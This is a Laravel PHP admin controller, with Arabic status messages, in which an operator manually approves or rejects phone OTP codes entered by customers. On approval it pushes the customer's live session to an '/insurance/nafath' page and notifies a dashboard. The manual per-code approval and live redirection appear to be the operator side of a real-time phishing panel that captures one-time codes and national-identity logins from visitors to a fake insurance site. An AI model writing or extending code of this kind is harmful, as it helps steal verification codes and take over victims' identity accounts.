<?php

namespace App\Http\Controllers\Admin;

use App\Events\PhoneOtpApproved;
use App\Events\PhoneOtpRejected;
use App\Http\Controllers\Admin\Traits\NotifiesDashboard;
use App\Http\Controllers\Controller;
use App\Http\Requests\Admin\AdminOtpActionRequest;
use App\Http\Requests\Admin\AdminOtpRejectRequest;
use App\Models\CustomerProfile;
use App\Models\OtpCode;
use Illuminate\Http\JsonResponse;
use Illuminate\Support\Facades\Log;

class AdminPhoneVerificationController extends Controller
{
    use NotifiesDashboard;

    /**
     * Approve phone verification OTP
     */
    public function approve(AdminOtpActionRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->verify();

        $customer = $otp->customer;
        $sessionId = $otp->session_id ?: $customer?->session_id;

        try {
            broadcast(new PhoneOtpApproved($sessionId, '/insurance/nafath', $customer?->id))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (approvePhone): ' . $e->getMessage());
        }

        $customer?->update(['current_page' => '/insurance/nafath']);

        $this->notifyDashboard($customer ?? $request->customer_ip, 'phone_approved');

        return response()->json([
            'success' => true,
            'message' => 'تمت الموافقة على التحقق الهاتفي - تم توجيه العميل إلى صفحة النفاذ',
        ]);
    }

    /**
     * Reject phone verification OTP
     */
    public function reject(AdminOtpRejectRequest $request): JsonResponse
    {
        $otp = OtpCode::where('id', $request->otp_id)->firstOrFail();

        if ($otp->status !== 'pending') {
            return response()->json([
                'success' => false,
                'message' => 'هذا الرمز تم معالجته مسبقاً',
            ], 422);
        }

        $otp->reject($request->input('reason'));

        $customer = $otp->customer;
        $sessionId = $otp->session_id ?: $customer?->session_id;

        try {
            broadcast(new PhoneOtpRejected($sessionId, $request->input('reason'), $customer?->id))->toOthers();
        } catch (\Throwable $e) {
            Log::warning('Broadcast failed (rejectPhone): ' . $e->getMessage());
        }

        $this->notifyDashboard($customer ?? $request->customer_ip, 'phone_rejected');

        return response()->json([
            'success' => true,
            'message' => 'تم رفض التحقق الهاتفي',
        ]);
    }
}
